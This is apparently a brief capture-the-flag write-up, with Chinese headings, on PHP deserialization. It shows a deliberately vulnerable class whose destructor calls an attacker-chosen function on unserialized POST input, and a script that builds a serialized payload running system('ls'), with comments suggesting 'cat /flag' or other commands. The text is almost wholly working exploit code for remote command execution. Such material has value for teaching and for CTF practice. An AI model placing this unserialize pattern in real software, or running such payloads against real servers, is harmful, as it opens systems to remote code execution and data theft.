#PHP序列化 
 ```php
<?php
class lyh
{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;

    function  __destruct()
    {
        $a = $this->lt;

        $a($this->lly);
    }
}
unserialize($_POST['nss']);
highlight_file(__FILE__);

```

```php
<?php
class lyh
{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
}
$p = new lyh();
$p->lt = 'system';
$p->lly = 'ls';
//替换其他命令
//cat /flag
echo serialize($p);
```